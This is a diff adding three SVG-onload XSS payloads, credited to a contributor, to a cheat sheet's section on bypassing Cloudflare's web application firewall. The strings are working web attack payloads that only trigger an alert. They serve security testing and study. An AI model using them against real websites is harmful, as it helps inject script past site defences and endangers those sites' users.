@@ -1127,6 +1127,13 @@ Works for CSP like `script-src 'self' data:` as warned about in the official [mo
 
 
 ## Common WAF Bypass
+###Cloudfare XSS Bypasses by [@Ganesh Rahate](https://github.com/Ganeshsrahate)
+####2nd October 2022
+```html
+<svg/Animation/onload=alert(1)>
+<svg/hackerone/onload=alert(1)>
+'">one,two<svg/onload=alert(1)>
+```
 
 ### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
 
